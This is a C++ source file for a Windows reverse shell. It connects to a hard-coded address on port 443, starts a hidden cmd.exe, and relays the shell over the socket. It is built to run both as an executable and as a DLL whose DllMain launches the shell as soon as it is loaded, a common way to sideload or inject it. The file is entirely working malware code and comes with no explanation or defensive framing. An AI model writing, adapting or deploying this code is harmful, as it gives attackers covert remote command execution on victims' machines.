#define _WIN32_WINNT 0x0600

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "kernel32.lib")

#define REMOTE_IP "192.168.147.128"
#define REMOTE_PORT 443

DWORD WINAPI ReverseShell(LPVOID) {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in servAddr;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return 1;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET)
        return 1;

    servAddr.sin_family = AF_INET;
    servAddr.sin_port = htons(REMOTE_PORT);
    servAddr.sin_addr.s_addr = inet_addr(REMOTE_IP);  // Replaced for MinGW

    if (connect(sock, (struct sockaddr*)&servAddr, sizeof(servAddr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    u_long mode = 1;
    ioctlsocket(sock, FIONBIO, &mode);

    SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hStdInRead, hStdInWrite;
    HANDLE hStdOutRead, hStdOutWrite;

    if (!CreatePipe(&hStdInRead, &hStdInWrite, &saAttr, 0) ||
        !SetHandleInformation(hStdInWrite, HANDLE_FLAG_INHERIT, 0))
        return 1;
    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &saAttr, 0) ||
        !SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0))
        return 1;

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdInput = hStdInRead;
    si.hStdOutput = si.hStdError = hStdOutWrite;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // Hide cmd window

    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        closesocket(sock);
        return 1;
    }

    CloseHandle(hStdInRead);
    CloseHandle(hStdOutWrite);

    char buffer[4096];
    DWORD dwRead;
    int ret;
    while (true) {
        while (PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &dwRead, NULL) && dwRead > 0) {
            if (ReadFile(hStdOutRead, buffer, sizeof(buffer), &dwRead, NULL) && dwRead > 0) {
                ret = send(sock, buffer, dwRead, 0);
                if (ret == SOCKET_ERROR) goto cleanup;
            }
        }

        ret = recv(sock, buffer, sizeof(buffer), 0);
        if (ret > 0) {
            DWORD written;
            WriteFile(hStdInWrite, buffer, ret, &written, NULL);
        }
        else if (ret == 0) {
            break;
        }
        else {
            int err = WSAGetLastError();
            if (err != WSAEWOULDBLOCK && err != WSAEINTR) {
                break;
            }
        }
        Sleep(50);
    }

cleanup:
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hStdInWrite);
    CloseHandle(hStdOutRead);
    closesocket(sock);
    WSACleanup();

    return 0;
}

extern "C" __declspec(dllexport) BOOL WINAPI DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, 0, ReverseShell, NULL, 0, NULL);
    }
    return TRUE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    HANDLE hThread = CreateThread(NULL, 0, ReverseShell, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        return 0;
    }
    return 1;
}
